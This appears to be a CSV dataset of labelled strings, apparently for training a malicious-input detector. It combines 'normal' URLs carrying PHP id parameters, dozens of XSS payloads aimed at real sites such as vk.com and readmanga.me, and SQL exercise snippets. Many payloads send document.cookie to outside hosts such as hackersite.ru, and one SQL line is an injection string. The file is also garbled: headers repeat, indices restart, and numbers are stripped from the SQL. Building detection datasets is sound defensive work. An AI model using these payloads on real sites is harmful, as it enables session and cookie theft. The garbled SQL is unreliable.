,language,source"
637,normal,"https : / / www . agencevu . com / photographers / photographer . php ? id = 1"
638,normal,"http : / / xn - - 90abdeg4afamkcabfvi7a8q . xn - - p1ai / page . php ? id = 1"
639,normal,"https : / / www . becker - international . com / index . php ? id = 1 % 26lang = 901"
640,normal,"http : / / www . mcfolsom . com / page . php ? id = 1"
641,normal,"http : / / www . world - art . ru / people . php ? id = 1"
642,normal,"http : / / xn - - n1addli . xn - - p1ai / index . php ? id = 1"
643,normal,"http : / / www . wenggroup . com / product . php ? id = 1"
644,normal,"https : / / www . cathouseonthekings . com / video / webcam . php ? id = 1"
645,normal,"http : / / www . pacific - textiles . com / businesses_facilities . php ? id = 1"
646,normal,"http : / / www . accessibleireland . com / category . php ? id = 3 % 26id1 = x"
647,normal,"http : / / www . vaganova . ru / page . php ? id = 265 % 26pid = 265 % 26level = 1"
648,normal,"http : / / vill . hakuba . nagano . jp / livecam / livecamera . php ? id = 1"
649,normal,"http : / / www . nagarapro . co . jp / top / artist / artist . php ? id = 1"
650,normal,"http : / / www . nhf . org . bd / aboutus . php ? id = 1"
651,normal,"http : / / www . radimpex . rs / download . php ? id = 1 % 26lang = en"
652,normal,"https : / / pubgshowcase . com / containers . php ? id = 1"
653,normal,"http : / / www . seehydropower . eu / download_tools / details . php ? id = 1"
654,normal,"https : / / unite . ut . ee / posts . php ? id = 1"
655,normal,"http : / / www . arabterm . org / index . php ? id = 3 % 26L = 1"
656,normal,"https : / / www . forum - pianoteq . com / viewforum . php ? id = 1"
657,normal,"http : / / www . yitechnology . com / support - faq . php ? id = 1"
658,normal,"http : / / www . brahmos . com / content . php ? id = 1"
659,normal,"https : / / www . flapjackfunds . com / program . php ? id = 1"
660,normal,"http : / / corp . toei - anim . co . jp / en / film / pickup . php ? id = 1"
662,normal,"http : / / www . iias - trieste - maribor . eu / index . php ? id = 1 % 26L = 1"
663,normal,"http : / / www . m - e - l . fr / fiche - education - artistique . php ? id = 1"
664,normal,"http : / / www . rancinan . com / official / photos . php ? id = 1"
666,normal,"http : / / www . mherc . mb . ca / page . php ? id = 1"
667,normal,"http : / / molvica . org / vesti_content . php ? id = 1"
668,normal,"http : / / www . dreamville - bg . com / ru / complex . php ? id = 1"
669,normal,"http : / / www . thespastudios . com / p . php ? id = 1"
670,normal,"https : / / www . i - cpan . es / detallePregunta . php ? id = 1"
671,normal,"http : / / www . tomkane . com / section . php ? id = 1"
672,normal,"http : / / www . belmos . ru / transp - artcl . php ? id = 1"
673,normal,"https : / / 74 . ru / forum / view . php ? id = 1000599"
674,normal,"http : / / www . lecoshop . ru / dir . php ? id = 1"
675,normal,"http : / / www . jevicko . cz / index . php ? id = 1020 % 26lang = cze"
676,normal,"http : / / www . vlktravel . com / tour . php ? id = 40"
677,normal,"http : / / www . anm - conso . com / prof - 03 . php ? id = 1"
678,normal,"https : / / www . filter . ru / index . php ? id = 50"
679,normal,"http : / / ohiofoodbanks . org / programs / programs . php ? id = 1"
681,normal,"http : / / 2017 . tiff - jp . net / ja / lineup / works . php ? id = 1"
682,normal,"http : / / www . sriaurobindoashram . org / music / sunil / index . php ? id = 1"
683,normal,"http : / / eurofo . ru / m / viewforum . php ? id = 1"
685,normal,"http : / / animatch . ca / machform / view . php ? id = 1"
686,normal,"http : / / www . sydneyshoot . com / buy . php ? id = 1"
687,normal,"http : / / www . theartofdicktwinney . com / statment . php ? id = 1"
688,normal,"https : / / place . fi . ncsu . edu / local / catalog / section . php ? id = 1"
689,normal,"http : / / www2 . ntnu . edu . tw / modules / tinyd0 / index . php ? id = 1"
690,normal,"http : / / www . hits . pt / gca / index . php ? id = 1"
691,normal,"http : / / www . warbears . com / missions . php ? id = 1"
692,normal,"https : / / www . hcilondon . in / pages . php ? id = 1"
693,normal,"http : / / www . firstreception . gov . gr / content . php ? id = 1"
694,normal,"http : / / www . opera - amsterdam . nl / pages . php ? id = 1"
698,normal,"http : / / www . ubraintv . com / watchchannel . php ? id = 6"
699,normal,"https : / / www . skau . sk / page . php ? id = 1"
700,normal,"https : / / www . tukui . org / addons . php ? id = 1"
701,normal,"http : / / www . semsk . kz / newscat . php ? id = 1"
702,normal,"http : / / www . msosocal . com / subpages / leadership_bio . php ? id = 1"
703,normal,"http : / / pravo . ua / events . php ? id = 66"
704,normal,"http : / / www . rainbow . com . my / support . php ? id = 1"
705,normal,"https : / / www . softube . com / index . php ? id = volume1"
706,normal,"http : / / www . chicken . org . au / page . php ? id = 1"
708,normal,"http : / / www . oardc . ohio - state . edu / weedguide / single_weed . php ? id = 1"
710,normal,"http : / / bagfa . de / index . php ? id = 1"
711,normal,"https : / / likumi . lv / doc . php ? id = 37967"
712,normal,"https : / / earthobservatory . nasa . gov / IOTD / view . php ? id = 91903"
717,normal,"https : / / www . otzyv . ru / read . php ? id = 206652"
725,normal,"http : / / dailyjinnah . com / epaper / page . php ? id = 1 % 26edition = karachi % 26dt = 01 - 04 - 2018"
726,normal,"http : / / dailyjinnah . com / epaper / page . php ? id = 1 % 26edition = islamabad % 26dt = 01 - 04 - 2018"
727,normal,"http : / / dailyjinnah . com / epaper / page . php ? id = 1 % 26edition = kpk % 26dt = 01 - 04 - 2018"
734,normal,"https : / / antizapret . info / org . php ? id = 1"
index,language,source"
0,JS,<link rel=pingback href="https://hackware.ru/xmlrpc.php"/><script> alert('xss')</script>"
1,JS,<script>img = new Image();img.src = "http://antichat.org/s/HakNet.gif?"+document.cookie;</script>"
2,JS,"http://yourdomain.ru/searh?q=»><script>alert(«cookie: «+document.cookie)</script>"
3,JS,<select><script>document.write("<OPTION value=1>"+document.location.href.substring(document.location.href.indexOf("default=")+8)+"</OPTION>");"
document.write("<OPTION value=2>English</OPTION>");</script></select>"
4,JS,<script>img = new Image();img.src = "http://hack-academy.ru/vzlom/newhacker/350-xss-anatomiya-cross-site-scripting.html?"+document.cookie;</script>"
5,JS,"https://vk.com/im?q=»><script>alert(«cookie: «+document.cookie)</script>"
6,JS,"https://www.championat.com/other/article-3376961-plovec-mihail-muhodinov-utonul-posle-pobedy-kak-eto-bylo-kto-vinovat.html?q=»><script>alert(«cookie: «+document.cookie)</script>"
7,JS,"http://bigpicture.ru/p/790398-amerikanka-pokazala-v-facebook-kak-na-samom-dele-vyglyadit-materinstvo-srazu-posle-rodov?q=»><script>alert(«cookie: «+document.cookie)</script>"
8,JS,"https://www.securitylab.ru/analytics/432835.php?q=»><script>alert(«cookie: «+document.cookie)</script>"
9,JS,"http://mazahaka.0pk.ru/viewtopic.php?q=»><script>alert(«cookie : «+document.cookie)</script>"
10,JS,"http://xssvulns.blogspot.ru/2012/02/cookie.html?q=»><script>alert(«cookie: «+document.cookie)</script>"
11,JS,"http://readmanga.me/?offset=30&max=30?q=»><script>alert(«cookie: «+document.cookie )</script>"
12,JS,"http://readmanga.me/overlord?q=»><script>alert(«cookie: «+ document.cookie )</script>"
13,JS,"http://readmanga.me/collection/prodavaemaia_manga?q=»><script>alert(«  cookie: «+document.cookie )</script>"
14,JS,"http://findanime.me/cheburashka?q=»><script>alert(«cookie: «+document.cookie)</script>"
15,JS,"http://xssvulns.blogspot.ru/2012/02/cookie.html="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
16,JS,"https://github.com/GetDKAN/dkan/issues/790="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
17,JS,"https://habrahabr.ru/post/66057/="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
18,JS,"http://readmanga.me/collection/prodavaemaia_manga="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
19,JS,"https://vk.com/worldofwarcraftofficial="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
20,JS,"https://vk.com/pj_club="><script>var img=new Image();img.src="http://hackersite4.ru/xss.jpg?"+ encodeURI( document.cookie);</script>"
21,JS,"https://vk.com/bespoleznyi="><script>var img=new Image();img.src="http://hackersit22.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
22,JS,"https://vk.com/club8995="><script>var img=new Image();img.src="http://hackersite1.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
23,JS,"https://vk.com/relax__art="><script>var img=new Image();img.src="http://hackersite.ru/xss3.jpg?"+ encodeURI(document.cookie );</script>"
24,JS,"https://vk.com/ret_con="><script>var img=new Image();img.src="http://hackersite3.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
25,JS,"https://vk.com/kinda_geek="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI( document.cookie);</script>"
26,JS,"https://vk.com/sh_ring="><script>var img=new Image();img.src="http://hackersite2.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
27,JS,"https://vk.com/bestgames="><script>var img=new Image();img.src="http://hackersite.ru/xss32.jpg?"+ encodeURI(document.cookie);</script>"
28,JS,"https://vk.com/unclewyrmwood="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
29,JS,"https://vk.com/dandaidaodu="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
30,JS,"https://vk.com/royal.arts="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
31,JS,"https://vk.com/uslc_group="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
32,JS,"https://vk.com/mertvun="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
33,JS,"https://vk.com/halalrecipes="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
34,JS,"https://vk.com/clubk_k_k="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
35,JS,"https://vk.com/o_ptimist?q=»><script>alert(«cookie: «+document.cookie)</script>"
36,JS,"https://vk.com/nice_student?q=»><script>alert(«cookie: «+document.cookie)</script>"
37,JS,"https://vk.com/megaotriv?q=»><script>alert(«cookie: «+document.cookie)</script>"
38,JS,"https://vk.com/s_arcazm?q=»><script>alert(«cookie: «+document.cookie)</script>"
39,JS,"https://vk.com/piter?q=»><script>alert(«cookie: «+document.cookie)</script>"
40,JS,"https://vk.com/prkolist?q=»><script>alert(«cookie: «+document.cookie)</script>"
41,JS,"https://vk.com/oprosnik_itmo?q=»><script>alert(«cookie: «+document.cookie)</script>"
42,JS,"https://vk.com/overhearitmo?q=»><script>alert(«cookie: «+document.cookie)</script>"
43,JS,"https://vk.com/proger_baby?q=»><script>alert(«cookie: «+document.cookie)</script>"
44,JS,"https://vk.com/tproger?q=»><script>alert(«cookie: «+document.cookie)</script"
45,JS,"https://vk.com/expartspb?q=»><script>alert(«cookie: «+document.cookie)</script>"
46,JS,"http://readmanga.me/tower_of_god/?q=»><script>alert(«cookie: «+document.cookie)</script>"
47,JS,"http://readmanga.me/literary_stray_dogs__dead_apple?q=»><script>alert(«cookie: «+document.cookie)</script>"
48,JS,"http://readmanga.me/one_punch_man?q=»><script>alert(«cookie: «+document.cookie)</script>"
49,JS,"http://readmanga.me/collection/suicid?q=»><script>alert(«cookie: «+document.cookie)</script>"
50,JS,"http://readmanga.me/magi_s_grandson?q=»><script>alert(«cookie: «+document.cookie)</script>"
51,JS,"http://readmanga.me/d_gray_man?q=»><script>alert(«cookie: «+document.cookie)</script>"
52,JS,"http://readmanga.me/helck?q=»><script>alert(«cookie: «+document.cookie)</script>"
53,JS,"http://readmanga.me/shonan_seven?q=»><script>alert(«cookie: «+document.cookie)</script>"
54,JS,"http://readmanga.me/demon_king_s_counterattack_?q=»><script>alert(«cookie: «+document.cookie)</script>"
55,JS,"http://readmanga.me/berserk_of_gluttony?q=»><script>alert(«cookie: «+document.cookie)</script"
56,JS,"http://readmanga.me/fairytail?q=»><script>alert(«cookie: «+document.cookie)</script>"
35,sql,"INSERT INTO CUSTOMER (customerid,customername) VALUES(,'alpha') ; INSERT INTO CUSTOMER (customerid,customername) VALUES(,'beta'); DROP CUSTOMER; SAVEPOINT s; INSERT INTO CUSTOMER (customerid,customername) VALUES(,'gamma'); SAVEPOINT s; INSERT INTO CUSTOMER (customerid,customername) VALUES(,'tera'); SAVEPOINT s; INSERT INTO CUSTOMER (customerid,customername) VALUES(,'omega'); ROLLBACK TO s; SELECT customername FROM CUSTOMER;"
158,sql,"CREATE TABLE CosineTable ( Angle INT NOT NULL, CosValue FLOAT NOT NULL PRIMARY KEY (Angle), UNIQUE (CosValue) );"
197,sql,"CREATE TABLE CosineTable ( Angle SMALLINT NOT NULL, CosValue FLOAT NOT NULL, PRIMARY KEY (Angle), UNIQUE (CosValue) );"
219,sql,"CREATE TABLE CosineTable ( Angle INT NOT NULL, CosValue INT NOT NULL, PRIMARY KEY (Angle), UNIQUE (CosValue) ); INSERT INTO CosineTable (Angle, CosValue) VALUES (,), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,); SELECT ((SELECT CosValue FROM CosineTable WHERE Angle = ) + ((SELECT CosValue FROM CosineTable WHERE Angle = ) - (SELECT CosValue FROM CosineTable WHERE Angle = )) * (-)/(-)) FROM CosineTable;"
226,sql,"CREATE TABLE CosineTable ( Angle SMALLINT NOT NULL, CosValue INT NOT NULL, PRIMARY KEY (Angle), UNIQUE (CosValue) ); INSERT INTO CosineTable (Angle, CosValue) VALUES (,), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,); SELECT * FROM CosineTable;-- your code goes here;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"
228,sql,"CREATE TABLE company ( company_id INT NOT NULL PRIMARY KEY, company_name varchar(), account_id INT NOT NULL, account_name varchar() );"
306,sql,"CREATE TABLE songs (name, date, length); -- your code goes here;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"
360,sql,"CREATE TABLE CosineTable( Angle INTEGER PRIMARY KEY, CosValue DECIMAL(,) NOT NULL ); Insert into CosineTable values (,),(,.),(,.),(,.),(,.),(,.),(,.), (,.),(,.),(,.),(,.),(,.),(,.),(,.),(,.),(,.), (,.),(,.),(,); Select -- /*CosValue + ((Select CosValue from cosineTable tbl where tbl.Angle = r.Angle +)- CosValue) */-- * -- /*(( - r.Angle)/.) */ -- from cosineTable r where (r.Angle < ) and (r.Angle + > )  and   r.Angle = r.Angle;"
372,sql,"CREATE TABLE CosineTable ( Angle INT NOT NULL, CosValue INT NOT NULL, PRIMARY KEY (Angle), UNIQUE (CosValue) ); INSERT INTO CosineTable (Angle, CosValue) VALUES (,), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,); SELECT DISTINCT(SELECT CosValue FROM CosineTable WHERE Angle > - AND Angle < ) + ((SELECT CosValue FROM CosineTable WHERE Angle < + AND Angle > ) - (SELECT CosValue FROM CosineTable WHERE Angle > - AND Angle < )) * ( - (SELECT Angle FROM CosineTable WHERE Angle > - AND Angle < )) / ((SELECT Angle FROM CosineTable WHERE Angle < + AND Angle > ) - (SELECT Angle FROM CosineTable WHERE Angle > - AND Angle < )) FROM CosineTable;"
822,sql,"CREATE TABLE CosineTable ( Angle INT NOT NULL, CosValue INT NOT NULL, PRIMARY KEY (Angle), UNIQUE (CosValue) ); INSERT INTO CosineTable (Angle, CosValue) VALUES (,), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,); SELECT MAX(CosValue) + (MIN(CosValue)-MAX(CosValue)) * (-MIN(Angle)) / (MAX(Angle)-MIN(Angle)) FROM CosineTable WHERE Angle > - AND Angle < + ;"
885,sql,"CREATE TABLE CosineTable ( Angle INT NOT NULL, CosValue INT NOT NULL, PRIMARY KEY (Angle), UNIQUE (CosValue) ); INSERT INTO CosineTable (Angle, CosValue) VALUES (,), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,); SELECT MAX(CosValue) + (MIN(CosValue) - MAX(CosValue)) * ( - MIN(Angle)) / (MAX(Angle) - MIN(Angle)) FROM CosineTable WHERE Angle > - AND Angle < + ;"
887,sql,"create table emp (id number,name varchar(),dept varchar()); insert into emp values(,'anu',); insert into emp values(,'vinu',); insert into emp values(,'RASa',); insert into emp values(,'AAdil',); insert into emp values(,'aadersh',); insert into emp values(,'Aanand',); select* from emp where id between and ;"
1018,sql,"CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); insert into Salaries (CheckNum, Amount) values (, ), (, ), (, .), (, ), (, .), (, ), (, ), (, .), (, ); select Amount, count(Amount) as AmountCount from Salaries join Salaries SalariesMax on Salaries.CheckNum = SalariesMax.CheckNum group by Salaries.Amount having Salaries.AmountCount = max(SalariesMax.AmountCount) order by Salaries.AmountCount desc;"
1022,sql,"create table events ( id int(), user_id int(), name varchar(), yyyy int(), mm int(), aspect varchar() ); create table responses ( response_id int(), event_id int(), response_string varchar() ); insert into events values (, , 'registration', , , 'invite_friends'), (, , 'registration', , , 'invite_friends'), (, , 'survey_question', , , 'motivation'), (, , 'survey_question', , , 'motivation'), (, , 'survey_question', , , 'motivation'), (, , 'survey_question', , , 'motivation'); insert into responses values (, , 'yes'), (, , 'no'), (, , 'high_fives'), (, , 'tough_love'), (, , 'evening'), (, , 'morning'); -- select count(*) from events; -- select count(*) from responses; -- example query: -- select count(*) -- from events -- where name = 'survey_question' -- and aspect = 'motivation'; -- . Write a query that would show how many different survey questions we've asked select count(distinct(aspect)) from events where name = 'survey_question';"
1165,sql,"CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); INSERT INTO Salaries (CheckNum, Amount) VALUES (,), (,), (,), (,), (,), (,), (,), (,), (,);"
1170,sql,"CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); INSERT INTO Salaries (CheckNum, Amount) VALUES (,), (,), (,), (,), (,), (,), (,), (,), (,); SELECT * FROM (SELECT Amount, Count(Amount) AS TotalAmount FROM Salaries GROUP BY Amount) HAVING TotalAmount = SELECT MAX(TotalAmount) FROM (SELECT Amount, Count(Amount) AS TotalAmount FROM Salaries GROUP BY Amount);"
1256,sql,"select ' or `ab`=`a`+'b'"
1368,sql,"CREATE TABLE CosineTable ( Angle INT NOT NULL, CosValue INT NOT NULL, PRIMARY KEY (Angle), UNIQUE (CosValue) ); INSERT INTO CosineTable (Angle, CosValue) VALUES (,), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,); SELECT * FROM CosineTable; SELECT MAX(CosValue) + (MIN(CosValue) - MAX(CosValue)) * ( - MIN(Angle)) / (MAX(Angle) - MIN(Angle)) FROM CosineTable WHERE Angle > - AND Angle < + ;"
1387,sql,"Select (Select ) As MySubQueryValue;"
1476,sql,"CREATE TABLE CosineTable ( Angle INT NOT NULL, CosValue DECIMAL(,) NOT NULL, PRIMARY KEY (Angle), UNIQUE (CosValue) ); INSERT INTO CosineTable (Angle, CosValue) VALUES (,), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,); SELECT * FROM CosineTable; SELECT MAX(CosValue) + (MIN(CosValue) - MAX(CosValue)) * ( - MIN(Angle)) / (MAX(Angle) - MIN(Angle)) FROM CosineTable WHERE Angle > - AND Angle < + ;"
1491,sql,"CREATE TABLE CosineTable ( Angle INTEGER NOT NULL, CosValue DOUBLE NOT NULL, PRIMARY KEY (Angle), UNIQUE (CosValue) ); INSERT INTO CosineTable (Angle, CosValue) VALUES (,), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,); SELECT * FROM CosineTable; SELECT MAX(CosValue) + (MIN(CosValue) - MAX(CosValue)) * ( - MIN(Angle)) / (MAX(Angle) - MIN(Angle)) FROM CosineTable WHERE Angle > - AND Angle < + ;"
1497,sql,"CREATE TABLE CosineTable ( Angle INTEGER NOT NULL, CosValue INTEGER NOT NULL, PRIMARY KEY (Angle), UNIQUE (CosValue) ); INSERT INTO CosineTable (Angle, CosValue) VALUES (,), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,); SELECT * FROM CosineTable; SELECT MAX(CosValue) + (MIN(CosValue) - MAX(CosValue)) * ( - MIN(Angle)) / (MAX(Angle) - MIN(Angle)) FROM CosineTable WHERE Angle > - AND Angle < + ;"
1499,sql,"SELECT Amount, COUNT('Amount') FROM Salaries;"
1521,sql,"CREATE TABLE CosineTable ( Angle INTEGER NOT NULL, CosValue DECIMAL(,) NOT NULL, PRIMARY KEY (Angle), UNIQUE (CosValue) ); INSERT INTO CosineTable (Angle, CosValue) VALUES (,), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,); SELECT * FROM CosineTable; SELECT MAX(CosValue) + (MIN(CosValue) - MAX(CosValue)) * ( - MIN(Angle)) / (MAX(Angle) - MIN(Angle)) FROM CosineTable WHERE Angle > - AND Angle < + ;"
1670,sql,"CREATE TABLE numbers ( id INTEGER PRIMARY KEY, name TEXT, number INTEGER ); INSERT INTO numbers (id, name, number) VALUES (, 'Math Class Girl', --), (, 'Starbucks Girl', --), (, 'Redhead Girl', --), (, 'Steve', --), (, 'Froyo Girl', --);"
1677,sql,"CREATE TABLE numbers ( id INTEGER PRIMARY KEY, name TEXT, number INTEGER ); INSERT INTO numbers (id, name, number) VALUES (, 'Math Class Girl', --), (, 'Starbucks Girl', --), (, 'Redhead Girl', --), (, 'Steve', --), (, 'Froyo Girl', --); SELECT * FROM numbers;"
1789,sql,"create table emp (id number,name varchar(),dept varchar()); insert into emp values(,'anu',); insert into emp values(,'vinu',); insert into emp values(,'RASa',); insert into emp values(,'AAdil',); insert into emp values(,'aadersh',); insert into emp values(,'Aanand',); select name from emp where name like %aa% ;"
1794,sql,"create table emp (id number,name varchar(),dept varchar()); insert into emp values(,'anu',); insert into emp values(,'vinu',); insert into emp values(,'RASa',); insert into emp values(,'AAdil',); insert into emp values(,'aadersh',); insert into emp values(,'Aanand',); select name from emp where name like '%aa%' ;"
1809,sql,"CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); INSERT INTO Salaries (CheckNum, Amount) VALUES (, ), (, ), (, ). (, ), (, ), (, .), (, ); SELECT Amount, COUNT(DISTINCT CHECK_NUM) FROM Salaries GROUP BY Amount Having COUNT(DISTINCT CHECK_NUM) = (SELECT MAX(COUNT(DISTINCT CHECK_NUM) FROM SALARIES);"
1854,sql,"create table CosineTable( Angle int, CosValue float ); Insert into CosineTable (Angle, CosValue) Values (,), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,); Select as x, CosValue as a From CosineTable where Angle like 'x%'; Select * From (Values ('')) as x; Select CosValue as a From CosineTable Where Angle like '%' and Angle < ; Select CosValue as b From CosineTable Where Angle like '%' and Angle > ;"
1861,sql,"CREATE TABLE numbers ( id INTEGER PRIMARY KEY, name VARCHAR(), number VARCHAR() ); INSERT INTO numbers (id, name, number) VALUES (, 'Math Class Girl', '--'), (, 'Starbucks Girl', '--'), (, 'Redhead Girl', '--'), (, 'Steve', '--'), (, 'Froyo Girl', '--');"
1903,sql,"-- your code goes here CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); INSERT INTO Salaries (CheckNum, Amount) VALUES (, ), (, ), (, ). (, ), (, ), (, .), (, ); SELECT Amount, COUNT(DISTINCT CHECK_NUM) FROM Salaries GROUP BY Amount Having COUNT(DISTINCT CHECK_NUM) = (SELECT MAX(COUNT(DISTINCT CHECK_NUM) FROM SALARIES);"
1904,sql,"-- your code goes here CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); INSERT INTO Salaries (CheckNum, Amount) VALUES (, ), (, ), (, ), (, ), (, ), (, .), (, ); SELECT Amount, COUNT(DISTINCT CHECK_NUM) FROM Salaries GROUP BY Amount HAVING COUNT(DISTINCT CHECK_NUM) = (SELECT MAX(COUNT(DISTINCT CHECK_NUM)) FROM SALARIES);"
1913,sql,"-- your code goes here -- your code goes here CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); INSERT INTO Salaries (CheckNum, Amount) VALUES (, ), (, ), (, ), (, ), (, ), (, .), (, ); SELECT Amount, COUNT(CheckNum) FROM Salaries GROUP BY Amount HAVING COUNT(CheckNum) = (SELECT MAX(COUNT(CheckNum)) FROM SALARIES);"
1930,sql,"-- your code goes here -- your code goes here -- your code goes here CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); INSERT INTO Salaries (CheckNum, Amount) VALUES (, ), (, ), (, ), (, ), (, ), (, .), (, ); SELECT * From Salaries;"
1986,sql,"-- your code goes here -- your code goes here -- your code goes here CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); INSERT INTO Salaries (CheckNum, Amount) VALUES (, ), (, ), (, ), (, ), (, ), (, .), (, ); SELECT Amount, COUNT(*) as CountMax FROM Salaries GROUP BY Amount WHERE (CountMax = (SELECT MAX(CountMax)));"
2035,sql,"CREATE TABLE CosineTable ( Angle INTEGER NOT NULL, CosValue DECIMAL() NOT NULL, PRIMARY KEY (Angle), UNIQUE (CosValue) ); INSERT INTO CosineTable (Angle, CosValue) VALUES (,), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,); SELECT MAX(CosValue) + (MIN(CosValue) - MAX(CosValue)) * ( - MIN(Angle)) / (MAX(Angle) - MIN(Angle)) FROM CosineTable WHERE Angle > - AND Angle < + ;"
2051,sql,"create table tbl(str varchar()); insert into tbl values('Hello world!'); select * from tbl;"
2058,sql,"CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); insert into Salaries values (, ), (, ), (, ) ; select count(Amount) from Salaries group by Amount order by count(Amount) desc;"
